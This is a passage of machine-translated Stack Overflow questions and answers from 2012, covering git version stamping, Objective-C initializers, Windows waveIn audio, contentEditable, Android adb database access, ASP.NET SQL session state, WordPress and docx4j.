                -e 's/@@GIT_VERSION@@/$(GIT_VERSION)/g' \
                $@.perl >$@+ && \
            chmod +x $@+ && \
            mv $@+ $@ 
    ```

    例如，如果您查看 的开头附近[`git-svn.perl`](https://github.com/git/git/blob/master/git-svn.perl)，您会看到：

    ```
    $VERSION = '@@GIT_VERSION@@'; 
    ```

在我的源代码树中，此规则已编译为`git-svn`包含以下行的文件：

```
 $VERSION = '1.7.11.rc0.55.gb2478aa'; 
```

所以如果我检查本地编译的版本`git-svn`，我会看到：

```
 $ git svn --version
    git-svn version 1.7.11.rc0.55.gb2478aa (svn 1.6.17) 
```

而如果我运行基于 rpm 的安装，我会看到：

```
 $ /usr/bin/git svn --version
    git-svn version 1.7.6.5 (svn 1.6.17) 
```

最后的输出表明，即使源代码是从已发布的 tarball 编译的，该压缩包在`.git/`子目录中不包含任何版本控制元数据，该方法仍然有效。这意味着版本字符串可以很好地区分稳定版本和开发快照。

虽然`git-svn`是 Perl 脚本，但显然相同的替换方法适用于您的 shell 脚本。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-13T14:24:49.340

与其自己创建标签，不如使用提交后挂钩。这个想法是检查 HEAD 是否包含修改版本分配的行，如果是，则创建一个新标签。这只是一个粗略的例子；它可能有问题，而且绝对没有它应该的效率。

```
#!/bin/bash

before=$( git log HEAD | awk -F= '/-version=/ {print $1}' )
after=$( git log HEAD | awk -F= '/+version=/ {print $1}' )

if [[ $before != $after ]]; then
    git tag myscript-$after
fi 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-15T15:36:31.593

> 不过，我不知道如何保持版本“最新”。

我确实喜欢挂钩后的建议。但是，另一种方法是，如果您已经有一个可用的构建系统，您也可以使用它。你有自动构建系统吗？詹金斯还是竹子？我们的构建系统为通过所有单元测试的每个成功构建创建一个新标签。当然这是一个脚本，所以你可能只需要运行单元测试，如果你有的话。您可以在构建作业中添加任务，以增加或匹配版本与成功构建或最新提交的标签，该标签运行并通过任何测试。

# objective-c - NSObject init 总是被调用吗？

> ID：11935481
> 
> 赞同：3
> 
> 时间：2012-08-13T13:40:03.827
> 
> 标签：objective-c, cocoa

在 Cocoa 中，建议始终调用超类的指定初始化程序。假设在对象初始化期间总是会调用 init 是否安全，即使对象没有使用 init 进行初始化？

例如，假设有一个类：`NSThingie`，它可以像`[[NSThingie alloc] initWithFoo: foo]`, 或一样初始化`[[NSThingie alloc] initWithFoo: foo andBar: bar]`。如果我重写 init，我可以假设它会在初始化期间的某个时候被调用吗？

* * *

编辑

也许我最初的问题措辞不太好。我知道重写 init 会导致超类中的 init 不被调用，我必须显式调用 init。我想知道的是，在苹果框架中，`[NSObject init]`是否总是被调用。如果我初始化一些 Apple 对象`[[NSAppleClass alloc] initWithSomething: something]`，我可以假设 NSObject 的 init 最终会在 NSAppleClass 的初始化过程中被调用吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T13:50:33.323

简短的回答：没有

您需要确保`init`为正在使用的类覆盖正确的方法

例如`UIView`有一个 init 方法`initWithFrame:`，一个非常基本的实现是：

```
- (id)initWithFrame:(CGRect)frame
{
    self = [super init]; //calls init because UIResponder has no custom init methods
    if (self){
        self.frame = frame;
    }
    return self;
} 
```

`init`在超类上被调用，但不是 on `UIView`，所以如果你要覆盖`init`而不是`initWithFrame:`你的初始化代码将永远不会运行

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T13:46:07.583

> 如果我重写 init，我可以假设它会在初始化期间的某个时候被调用吗？

如果您覆盖和`init`方法，您有责任调用指定的初始化程序。开发人员有责任调用子类化类的正确初始化程序。调用指定初始化程序的原因是确保类在其预期状态下构造。不调用正确的初始化程序或根本不调用初始化程序可能会导致未定义/不良行为。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T13:48:44.247

是的，“init”默认构造函数不进行特殊处理
，因为 NSObject 类中定义的 init 方法不进行初始化；它只是返回自我。

# windows - waveInClose/Reset/Stop - 没有消息

> ID：11935486
> 
> 赞同：-1
> 
> 时间：2012-08-13T13:40:14.127
> 
> 标签：windows, audio

我正在使用 waveInProc 回调进行音频采样。问题是，当我尝试停止采样并关闭音频设备时，我在回调中没有收到任何消息 - 尝试了 waveInStop、waveInClose、waveInReset。

请建议。10xs，那鸿

```
HWAVEIN  hWaveIn
waveInOpen(&hWaveIn,WAVE_MAPPER,&waveform,(DWORD)waveInProc,0, CALLBACK_FUNCTION);
waveInStart(hWaveIn);

waveInStop(hWaveIn); //OR
waveInClose(hWaveIn); //OR
waveInReset(hWaveIn); //OR 
```

更新：这是代码：

开始：

```
waveInOpen(&hWaveIn,WAVE_MAPPER,&waveform,(DWORD)waveInProc,0, CALLBACK_FUNCTION);
waveInPrepareHeader(hWaveIn,pWaveHdr1,sizeof(WAVEHDR));
waveInAddBuffer(hWaveIn,pWaveHdr1,sizeof(WAVEHDR));
waveInStart(hWaveIn); 
```

* * *

```
 void CALLBACK waveInProc(  HWAVEIN hwi, UINT uMsg, DWORD dwInstance, 
                            DWORD dwParam1,   DWORD       dwParam2    )
  {

     if (uMsg == WIM_OPEN)
     {
     return;
     }
     if (uMsg == WIM_DATA)
     {
     //process data
     waveInAddBuffer(hWaveIn,(PWAVEHDR)dwParam1,sizeof(WAVEHDR));
     return;
     }
     if (uMsg == WIM_CLOSE) //NOT GETTING THIS MSG

     {
      printf("*****************got WIM_CLOSE\n");
     }
 } 
```

* * *

那么如何停止采样并关闭音频设备呢？

* * *

这是代码：开始：

```
waveInOpen(&hWaveIn,WAVE_MAPPER,&waveform,(DWORD)waveInProc,0, CALLBACK_FUNCTION);
waveInPrepareHeader(hWaveIn,pWaveHdr1,sizeof(WAVEHDR));
waveInAddBuffer(hWaveIn,pWaveHdr1,sizeof(WAVEHDR));
waveInStart(hWaveIn); 
```

* * *

```
 void CALLBACK waveInProc(  HWAVEIN hwi, UINT uMsg, DWORD dwInstance, 
                            DWORD dwParam1,   DWORD       dwParam2    )
  {

     if (uMsg == WIM_OPEN)
     {
     return;
     }
     if (uMsg == WIM_DATA)
     {
     //process data
     waveInAddBuffer(hWaveIn,(PWAVEHDR)dwParam1,sizeof(WAVEHDR));
     return;
     }
     if (uMsg == WIM_CLOSE) //NOT GETTING THIS MSG

     {
      printf("*****************got WIM_CLOSE\n");
     }
 } 
```

* * *

那么如何停止采样并关闭音频设备呢？

10xs，那鸿

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:05:43.660

你在检查你的`waveInOpen`结果吗？

因为它按预期工作：

```
hWaveIn 0x005B7768, nMessage 0x03BE, nInstance 0, nParameter1 0, nParameter2 0
nWaveInOpenResult 0, hWaveIn 0x005B7768
hWaveIn 0x005B7768, nMessage 0x03BF (WIM_CLOSE), nInstance 0, nParameter1 0, nParameter2 0 
```

代码：

```
#include "stdafx.h"
#include <mmsystem.h>

#pragma comment(lib, "winmm.lib")

VOID CALLBACK waveInProc(HWAVEIN hWaveIn, UINT nMessage, DWORD_PTR nInstance, DWORD_PTR nParameter1, DWORD_PTR nParameter2)
{
    _tprintf(_T("hWaveIn 0x%p, nMessage 0x%04X, nInstance %d, nParameter1 %d, nParameter2 %d\n"), hWaveIn, nMessage, nInstance, nParameter1, nParameter2);
}

int _tmain(int argc, _TCHAR* argv[])
{
    WAVEFORMATEX Format = { WAVE_FORMAT_PCM, 1, 8000, 16000, 2, 16, 0 };
    HWAVEIN hWaveIn = NULL;
    const MMRESULT nWaveInOpenResult = waveInOpen(&hWaveIn, WAVE_MAPPER, &Format, (DWORD_PTR) &waveInProc, 0, CALLBACK_FUNCTION);
    _tprintf(_T("nWaveInOpenResult %d, hWaveIn 0x%p\n"), nWaveInOpenResult, hWaveIn);
    waveInStart(hWaveIn);
    waveInStop(hWaveIn);
    waveInClose(hWaveIn);
    return 0;
} 
```

在实际代码中处理数据时，请务必考虑到这一点：[在回调函数中](http://msdn.microsoft.com/en-us/library/windows/desktop/dd743849%28v=vs.85%29.aspx)：

> 应用程序**不应**从回调函数内部调用任何系统定义的函数，EnterCriticalSection、LeaveCriticalSection、midiOutLongMsg、midiOutShortMsg、OutputDebugString、PostMessage、PostThreadMessage、SetEvent、timeGetSystemTime、timeGetTime、timeKillEvent 和 timeSetEvent 除外。 **调用其他波函数会导致死锁**。

要重新添加缓冲区，您需要通过使用`PostMessage`or向另一个线程发出信号来指示需要`SetEvent`，以便回调之外的代码可以接收此指示并从那里重新添加空缓冲区。

# javascript - contentEditable, CTRL-B CTRL-I 和保存

> ID：11935487
> 
> 赞同：7
> 
> 时间：2012-08-13T13:40:20.007
> 
> 标签：javascript, css, html

我刚刚开始使用 contentEditable，并没有找到太多全面的信息。

我注意到在 Chrome 中，我可以通过按`CTRL`-`B`和`CTRL`-使单词变为粗体/斜体`I`。

这可能是其他浏览器的预期行为吗？例如，这适用于 Chrome：

```
<div class="container" id="typer" onclick="this.contentEditable='true';"> 
```

[http://jsfiddle.net/uk6DA/15/](http://jsfiddle.net/uk6DA/15/)

我想知道我是否可以阅读这种格式，以保存用户的编辑？另外，我可以创建一个粗体按钮和斜体按钮来触发`CTRL`-`B`和`CTRL`-`I`吗？还是我需要依靠用户按`CTRL`-`B`和`CTRL`- `I`（这意味着向他们提供一个告诉他们的便条）？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-08-13T14:08:31.643

这是所有主流浏览器的标准。`document.execCommand()`在所有主要浏览器中也有可用的键盘快捷键的编程等效项。例如，粗体和斜体命令可以执行如下：

```
document.execCommand("Bold", false, null);
document.execCommand("Italic", false, null); 
```

但是，生成的标记因浏览器而异。例如，粗体的变体包括`<b>foo</b>`,`<strong>foo</strong>`和`<span style="font-weight: bold">foo</span>`.

参考：

*   [MSDN](http://msdn.microsoft.com/en-us/library/ms536419%28v=vs.85%29.aspx) ,[命令列表](http://msdn.microsoft.com/en-us/library/hh801237%28v=vs.85%29.aspx)
*   [MDN](https://developer.mozilla.org/en-US/docs/Rich-Text_Editing_in_Mozilla#Executing_Commands) (Mozilla)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T13:44:51.270

简短回答“是”。你可能会觉得这篇[文章](http://perplexed.co.uk/993_contenteditable_cross_browser_wysiwyg.htm)很有趣。许多开发人员都走上了这条路。如果您想要一个不错的所见即所得编辑器，有很多可供选择。

关于您的问题：是的，您可以阅读格式。尝试在元素上使用innerHTML，您会在粗体周围和斜体周围找到`<b>`标签。`<i>`另外 - 在我分享的文章中，您将了解如何创建一个加粗的按钮。希望这可以帮助！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-11-13T19:48:58.877

您可以在此处查看哪些浏览器支持 contentEditable 功能：

[https://caniuse.com/#search=contenteditable](https://caniuse.com/#search=contenteditable)

正如 Tim Down 所说，您可以将其称为`document.execCommand()`粗体或斜体。

但是，不能期望所有浏览器中的键盘快捷键都相同，浏览器快捷键没有标准化。`CTRL-B`例如，Firefox 中的书签快捷方式。

# jsf-2 - 带有 JSF2 的标记 xhtml 中的条件

> ID：11935488
> 
> 赞同：0
> 
> 时间：2012-08-13T13:40:20.560
> 
> 标签：jsf-2, if-statement, primefaces

我有这部分代码使用 primeface 组件：

```
<h:outputText value="Division : " />  
                        <p:inplace id="basic2">  
                            <p:inputText value="#{utilisateursController.u1.division}" />  
                        </p:inplace> 
```

我想测试#{utilisateursController.u1.division}是否等于“”（或null）它显示“请输入一个有效的部门”，否则它显示#{utilisateursController.u1.division}的值

我已经在某处看到了，但我不知道如何使用

你还记得我吗 ？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T13:46:00.157

像这样的东西？

```
<p:inputText value="#{(not empty utilisateursController.u1.division)?utilisateursController.u1.division:'Please enter a valid division'}" /> 
```

# javascript - Dnd avatar：如何在dragOver上获得所见即所得的预览？

> ID：11935489
> 
> 赞同：2
> 
> 时间：2012-08-13T13:40:22.050
> 
> 标签：javascript, dom, dojo, drag-and-drop, dojo-dnd

我们收到客户的请求，要求支持以下场景：

*   在一个页面上，我们有一个 container:`div`元素，它同时是`dojo.dnd.Source`.
*   在容器内，我们有 9 个`div`内容相似的元素：2 个按钮和 2 个组合框

*   用户应该能够`div`通过简单地在容器内拖动它们来定义这 9 个元素的顺序。

任务是在拖动时呈现可能的布局预览。

将欣赏任何想法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T18:29:53.287

专注于您的评论并首次尝试此解决方案，我谦虚地提出以下建议：

如果事物正在被动画化并且对鼠标指针变化敏感，则应将两者分开：

*   将具有拖放事件订阅（父）的元素单独保留。永远不要改变它的外观。
*   在此元素内创建一个元素（子元素），该元素会被动画化，但不会影响其父元素。
*   父级可以是透明的。

这有帮助吗？

# android - Android 在数据文件夹中看不到任何内容

> ID：11935491
> 
> 赞同：0
> 
> 时间：2012-08-13T13:40:33.317
> 
> 标签：android, database, sqlite, adb

我试图以任何可能的方式查看 SQLite 数据库（我有一个根设备）。我在 Eclipse 中尝试了文件资源管理器，但在数据文件夹下看不到任何内容。任何人都可以帮我解决这个问题，我试图到处搜索，但找不到明确的解决方案。我也尝试了 adb shell，但我无法使用“ls”命令查看数据文件夹中的内容列表。错误 Opendir 失败。没有权限

我猜这与权利有关，但我该如何解决

请帮忙

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:46:52.857

您需要root权限才能浏览`DATA`目录... `From phone` 我`terminal emulator`用来完成这项工作.....只需打开`terminal`然后输入，然后`su`它会要求权限。那么你需要输入`cd data/data/WhereEverYouNeedToGo/databases`并且`"WhereEverYouNeedToGo"`应该是包名。之后，您可以对数据库做任何您想做的事情。

`from PC`

打开`terminal`或`cmd`转到您的`adb`目录然后运行`adb shell`然后`su`然后
`cd data/data/WhereEverYouNeedToGo/databases`

希望它有所帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T13:43:53.323

使用“adb root”以 root 模式运行 adb

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-13T13:43:53.640

```
adb shell
su
ls /data/ 
```

尝试这个

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T14:02:34.943

您需要有路由设备，或者您的设备应该是“Android Dev Phone”才能浏览该目录。尝试使用模拟器检查相同的内容，您将能够看到数据文件夹的内容。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-13T13:54:11.933

您已经获得了许多关于如何利用 root 功能的答案，但是由于 android 是在没有 root 假设的情况下设计的，因此您在开发应用程序时也可以使用其他方法。

1) 在专家菜单中包含将数据库复制到 sdcard 的功能；android java 中没有文件复制方法（在大多数库存情况下没有'cp' shell 命令），但您可以在此处使用复制例程找到许多答案。

2) 使您的 apk 可调试并使用 run-as 命令获取以应用程序用户 ID 运行并在应用程序的数据目录中启动的 shell。然后，如果应用程序具有该权限，您可以将数据库复制到 sdcard。

3）让您的应用**在开发期间**将数据库文件的权限设置为全球可读。虽然您无法浏览目录树以找到它，但您可以通过提供数据库文件的完整路径名来 adb 拉取数据库文件。

# asp.net - 在 SQL Server 中存储会话 (asp.net)

> ID：11935492
> 
> 赞同：4
> 
> 时间：2012-08-13T13:40:35.853
> 
> 标签：asp.net, sql-server

如果我们想在 SQL Server 中存储会话，哪个表存储会话？

要实现 ASP.NET SQL Server 模式的会话状态管理，必须修改**应用程序的 Web.config 文件的元素如下：**

 **1.设置**模式**属性**SQLServer 的元素以指示会话状态存储在 SQL Server 中。**

 **2.设置**sqlConnectionString**属性为SQL Server指定连接字符串。例如：

```
 sqlConnectionString="data source=MySQLServer;user id=<username>;password=<strongpassword>" 
```

注意 用户 必须具有对数据库执行此操作的权限。

修改后的元素应如下所示：

```
 <sessionState 
        mode="SQLServer"
        sqlConnectionString="data source=127.0.0.1;user id=<username>;password=<strongpassword>"
        cookieless="false" 
        timeout="20" 
/> 
```

问题是是否有一个存储会话的特定表？

SQL Server 中的存储会话是一个模糊的概念。

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T13:48:22.797

您应该首先运行[ASP.Net SQL Server 注册工具](http://msdn.microsoft.com/en-us/library/ms229862.aspx)。该工具将创建适当的会话状态表。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-13T13:57:44.113

要使用 SQLServer 模式，您必须首先确保在 SQL Server 上安装了 ASP.NET 会话状态数据库。您可以使用 Aspnet_regsql.exe 工具安装 ASP.NET 会话状态数据库。Aspnet_regsql.exe 位于 %windir%\Microsoft.NET\Framework\v4.0.30319（32 位系统 .net framework 4）

按照以下链接查看如何添加会话表 [如何配置 SQL 服务器以存储会话状态](http://blogs.msdn.com/b/akshayns/archive/2008/10/04/how-to-configure-sql-server-to-store-a-session-state.aspx)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-13T14:10:26.373

其他答案是正确的，因为您应该使用该`Aspnet_regsql.exe`工具为您创建会话数据库。但出于兴趣，一旦完成，您可以找到存储在临时会话表中的所有会话。

例如，我的会话数据库被调用`ASPState`，感兴趣的表被调用`ASPStateTempSessions`。ASP.NET 调用存储过程来管理此表中的会话。****

# jquery - 在 Sencha / Phonegap 应用程序中读取本地 XML？

> ID：11935494
> 
> 赞同：0
> 
> 时间：2012-08-13T13:40:41.530
> 
> 标签：jquery, jquery-mobile, cordova, sencha-touch, extjs

在我的 jQuery/Phonegap 应用程序中，我正在使用以下方法读取本地 XML 的内容：

```
$.get('resources/metadata.xml', function(xml){
alert(xml);
},'text'); 
```

但是如何在 Sencha/Phonegap 应用程序中做到这一点？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T18:59:06.317

是否要解析 XML 文件？

看看[`XML reader`](http://docs.sencha.com/touch/2-0/#!/api/Ext.data.reader.Xml)Sencha Touch 2

# parsing - 学习解析的在线教程和书籍

> ID：11935495
> 
> 赞同：-2
> 
> 时间：2012-08-13T13:40:44.663
> 
> 标签：parsing

嗨，我是解析新手，我打算为我的项目学习它。任何人都可以推荐我相同的好书或教程吗？我对上下文无关语法有一点了解，但这就是我所拥有的全部知识

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:43:26.773

这本书教了很多东西，包括解析。它被认为是编译器中的经典之作。

[http://www.amazon.com/Compilers-Principles-Techniques-Alfred-Aho/dp/0201100886](https://rads.stackoverflow.com/amzn/click/com/0201100886 "编译器：原理、技术和工具")

# php - bsg_head() 时内容消失；被添加到标签

> ID：11935496
> 
> 赞同：0
> 
> 时间：2012-08-13T13:40:54.803
> 
> 标签：php, html, wordpress, wordpress-theming

当我添加时，我正在使用 wordpress

```
<?php bsg_head(); ?> 
```

到页眉页面上的所有内容都消失了。样式表中的格式仍然会应用，尽管它会更改背景颜色。谁能帮我弄清楚为什么？

单.php

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title><?php bloginfo('name'); ?> | <?php bloginfo('title'); ?></title>
<link href="<?php bloginfo('stylesheet_url'); ?>" rel="stylesheet" type="text/css" />
<?php bsg_head(); ?>
</head>

<body>

<div class="container_12" id="singlepost">
    <div class="grid_12">

      <?php if (have_posts()) : ?>

      <?php while (have_posts()) : the_post(); ?>

      <h2><?php the_title(); ?></h2>
                <?php the_content(); ?>

      <?php endwhile; ?>

      <?php else : ?>

      <?php endif; ?>

    </div>
    <div class="clear"></div>
</div>

</body>
</html> 
```

样式.css

```
/*
Theme Name:
Theme URI: http://www..co.uk
Description: 
Version: 2
Author: Alex Sadler
Author URI: http://www..co.uk
*/

@charset "UTF-8";
/* CSS Document */

@import url("css/grid.css");
@import url("css/fonts/fonts.css");
@import url("css/coda-slider.css");
@import url("css/jquery.fancybox.css");

body,td,th {
    font-family: Verdana, Arial, Helvetica, sans-serif;
    font-size: 10px;
    color: #FFFFFF;
}
body {
    background-color: #3D341A;
    background-repeat: repeat-x;
    margin: 0px;
    padding: 0px;
}
a:link {
    color: #FFFFFF;
    font-weight: bold;
    text-decoration: none;
}
a:visited {
    color: #FFFFFF;
    text-decoration: none;
}
a:hover {
    color: #CCCCCC;
    text-decoration: underline;
}
a:active {
    color: #FFFFFF;
    text-decoration: none;
}
h1,h2,h3,h4,h5,h6 {
    font-family: nexa_boldregular, Arial, Helvetica, sans-serif;
    text-transform: uppercase;
    margin: 5px 0px 5px;
    padding: 0px;
}
h1 {
    font-size: 18px;
    color: #FFFFFF;
}
h2 {
    font-size: 12px;
    color: #FFFFFF;
}
h3 {
    font-size: 10px;
    color: #FFFFFF;
}
P {
    margin: 0px;
    padding: 0px;
}
IMG {
    border: 0px;
}
.center {
    text-align: center;
}
#contentwrapper {
    padding-bottom: 20px;
}
#header {
    padding-top: 20px;
    position: fixed;
    width: 100%;
    padding-bottom: 20px;
    z-index: 99;
}
#title h1 {
    font-size: 24px;
}
#info {
    text-align: right;
    text-transform: uppercase;
    font: normal 12px nexa_lightregular, Arial, Helvetica, sans-serif;
}
#info .headerphone {
    font-family: nexa_boldregular, Arial, Helvetica, sans-serif;
}
#slogan {
    padding-top: 350px;
    text-shadow: 0px 0px 2px #000;
}
#slogan h1 {
    margin: -30px 0px 0px;
    padding: 0px;
    font: small-caps 120px nexa_boldregular, Arial, Helvetica, sans-serif;
}
#slogan h2 {
    margin: 0px;
    padding: 0px;
    font: small-caps 60px nexa_boldregular, Arial, Helvetica, sans-serif;
}
.block {
    height: 170px;
    width: 260px;
    padding: 20px;
    background: #525055 no-repeat center center;
    float: left;
}
.portfolioblock {
    height: 210px;
    width: 300px;
    background: #525055 no-repeat center center;
    float: left;
    overflow: hidden;
}
.portfolioblock .rollover {
    height: 170px;
    width: 260px;
    padding: 20px;
    background: url(img/rolloverbg.png); 
    margin-top: 210px; 
    -webkit-transition: all 0.2s linear; 
    -moz-transition: all 0.2s linear; 
    -o-transition: all 0.2s linear;
}
.portfolioblock:hover .rollover {
    float: left; 
    margin-top: 0px;
    -webkit-transition: all 0.2s linear; 
    -moz-transition: all 0.2s linear; 
    -o-transition: all 0.2s linear;
}
.portfolioblock img {
    margin-bottom: 20px;
}
.text h1 {
    margin-left: 55px;
    margin-top: 25px;
}
#socialmedia {
    text-align: right;  
}
#singlepost {
    padding-top: 20px;
    padding-bottom: 20px;   
}
#blog a {
    font-weight: normal;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:44:06.963

据我所知，您需要`<?php wp_head(); ?>`. 不要忘记`<?php wp_footer(); ?>`在您的页脚中，在您的`</body>`标签之前，这通常用于与 javascript 库相呼应的插件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:45:36.993

在php中启用错误报告，以便您可以看到确切的错误

添加以下代码

```
<? error_reporting(E_ALL); ?> 
```

如需更多 PHP 更新，请访问[http://www.phpsyntax.blogspot.in/](http://www.phpsyntax.blogspot.in/)

# xml-namespaces - 在 docx4j Differencer.diff() 调用中使用 o:allowincell 未声明的命名空间

> ID：11935500
> 
> 赞同：1
> 
> 时间：2012-08-13T13:41:02.517
> 
> 标签：xml-namespaces, docx4j

当使用 docx4j 将文档转换过程的结果与原始结果进行比较时，我们的一个测试用例出现以下错误：

`com.topologi.diffx.xml.UndeclaredNamespaceException: The namespace URI "urn:schemas-microsoft-com:office:office for allowincell" has not been mapped to any prefix.`

我通过使用此方法（基于[此答案](https://stackoverflow.com/questions/11347961/obtain-details-of-docx4j-comparison)）将原始文档与自身进行比较，消除了转换过程引入错误的可能性：

```
private static final String compareToSelf( File fileToCompare ) throws Docx4JException {
    WordprocessingMLPackage olderPackage = WordprocessingMLPackage.load( fileToCompare );
    WordprocessingMLPackage newerPackage = WordprocessingMLPackage.load( fileToCompare );

    Body newerBody = newerPackage.getMainDocumentPart().getJaxbElement().getBody();
    Body olderBody = olderPackage.getMainDocumentPart().getJaxbElement().getBody();

    java.io.StringWriter sw = new java.io.StringWriter();
    javax.xml.transform.stream.StreamResult result = new javax.xml.transform.stream.StreamResult(sw);
    Calendar changeDate = null;

    Differencer pd = new Differencer();
    pd.setRelsDiffIdentifier("blagh"); // not necessary in this case
    pd.diff( newerBody, olderBody, result, "someone", changeDate,
                newerPackage.getMainDocumentPart().getRelationshipsPart(),
                olderPackage.getMainDocumentPart().getRelationshipsPart() );

    return sw.toString();
} 
```

堆栈跟踪：

```
com.topologi.diffx.xml.UndeclaredNamespaceException：命名空间 URI“urn:schemas-microsoft-com:office:office for allowincell”尚未映射到任何前缀。
    在 com.topologi.diffx.xml.NSAwareXMLWriter.getQName(NSAwareXMLWriter.java:604)
    在 com.topologi.diffx.xml.NSAwareXMLWriter.attribute（NSAwareXMLWriter.java:527）
    在 com.topologi.diffx.event.impl.AttributeEventNSImpl.toXML(AttributeEventNSImpl.java:244)
    在 com.topologi.diffx.format.SmartXMLFormatter.format(SmartXMLFormatter.java:212)
    在 com.topologi.diffx.sequence.EventSequence.format(EventSequence.java:349)
    在 com.topologi.diffx.Docx4jDriver.diff(Docx4jDriver.java:230)
    在 org.docx4j.diff.Differencer.diffWorker(Differencer.java:320)
    在 org.docx4j.diff.Differencer.diff(Differencer.java:298)
    在 exec.DocxCompareTest.compareToSelf(DocxCompareTest.java:212)
    在 exec.DocxCompareTest.handleInputFile(DocxCompareTest.java:124)
    在 exec.ValidationTest.execute(ValidationTest.java:52)
    在 exec.BtbRoundtripTest.main(BtbRoundtripTest.java:13)
java.lang.NullPointerException
    在 org.docx4j.diff.Differencer.diffWorker(Differencer.java:377)
    在 org.docx4j.diff.Differencer.diff(Differencer.java:298)
    在 exec.DocxCompareTest.compareToSelf(DocxCompareTest.java:212)
    在 exec.DocxCompareTest.handleInputFile(DocxCompareTest.java:124)
    在 exec.ValidationTest.execute(ValidationTest.java:52)
    在 exec.BtbRoundtripTest.main(BtbRoundtripTest.java:13)

```

我已经解压缩了 *.docx 文件，并且`o:allowincell`似乎正确映射到 包含的 .docx 文件`xmlns:o="urn:schemas-microsoft-com:office:office"`的`<w:document>`标签中`document.xml`。

测试文档可以从这里下载：[https ://docs.google.com/open?id=0B6_h2TfqvEdeZE43X3RSWnFIZHc](https://docs.google.com/open?id=0B6_h2TfqvEdeZE43X3RSWnFIZHc)

关于如何解决这个问题的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-19T22:32:05.910

在第 192 和 206 行的 Docx4jDriver 中有：

```
 e.setAttributeNS("http://www.w3.org/2000/xmlns/", "xmlns:w",
            "http://schemas.openxmlformats.org/wordprocessingml/2006/main"); 
```

您可能需要添加 xmlns:o。最终，需要改进该代码以自动添加所有相关的命名空间。

# c++ - 使用 C++ (MFC) 从网络摄像头捕获视频到文件

> ID：11935506
> 
> 赞同：0
> 
> 时间：2012-08-13T13:41:31.090
> 
> 标签：c++, video, mfc, webcam

我需要将网络摄像头视频捕获添加到旧版 MFC C++ 应用程序。视频需要保存为 MP4。做了一些谷歌搜索，但没有遇到任何看起来很有希望的东西。关于最佳方法的任何建议？

编辑：Windows 平台。

编辑：必须与 XP 兼容

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:07:22.553

我会说将 OpenCV 视为一个库，在这方面挂钩他们的视频捕获，它可以写入 mp4 但你需要几个其他库来处理输出流（在 Linux 上我会说 ffmpeg 和x264），这应该会以合理的麻烦将缓冲区放入容器中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T17:49:47.300

有几个流行的选项可供选择：

*   DirectShow API - 它没有用于视频和音频的库存 MPEG-4 压缩器，也没有用于 .MP4 格式的库存多路复用器，尽管 GDCL 提供了一个出色的免费多路复用器：[http ://www.gdcl.co.uk/ mpeg4/](http://www.gdcl.co.uk/mpeg4/) . 还有不错的文档，很多示例
*   Media Foundation API - 它拥有您需要的一切（编解码器、多路复用器），但仅限于 Windows 7（甚至可能不是所有版本）
*   [`FFmpeg`](http://ffmpeg.org/)和`libavcodec`/`libavformat`绝对相关，但是 H.264 编码器仅在 GPL 许可下可用，不确定那里的视频捕获部分，您可能很难寻找文档和示例。

# performance - 稍后映射减少或在写入时计算？

> ID：11935507
> 
> 赞同：2
> 
> 时间：2012-08-13T13:41:38.980
> 
> 标签：performance, mapreduce, aggregate-functions

在我当前的项目中，我们编写了一些 map reduce 作业，在某些情况下，这些作业可以在相关数据更改时计算出来。

我很好奇在执行聚合计算的最便宜时间方面是否有一些公认的经验法则。

我可能会这样开始：

1.  如果您别无选择，只能传递所有记录，并且数据经常更改，则将其推迟到批处理。
2.  对于整体计算成本高但易于增加的东西，您应该在写入时增加。

# javascript - 旋转角度

> ID：11935509
> 
> 赞同：0
> 
> 时间：2012-08-13T13:41:43.353
> 
> 标签：javascript, math

这是代码，我正在尝试获取旋转角度。我正在围绕表盘旋转图像。我把所有的角度都弄对了，除了当它达到 270 度时，它会做一些时髦的事情。角度变为负值。它从 0 到 270 工作正常，但我无法让它显示 270 到 360 之间的角度。请给我一些建议

```
 this.rotate = function(x){
    this.node.style.MozTransform="rotate("+x+"deg)";
    this.node.style.WebkitTransform="rotate("+x+"deg)";
    this.node.style.OTransform="rotate("+x+"deg)";
    this.node.style.msTransform="rotate("+x+"deg)";
    this.node.style.Transform="rotate("+x+"deg)";

myintID = setInterval(function(){
    //Math!
    angleFromEye = Math.atan2((cursorLocation.y-self.my_y), cursorLocation.x-  self.my_x)*(180/Math.PI)+ 90;
    //Rotate
    self.rotate(angleFromEye); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T13:47:09.363

实际上，对于 -90 到 0 的值，角度也是负数，但是您将 90 添加到角度，所以您看不到。

当它是负数时，只需将 360 添加到角度：

```
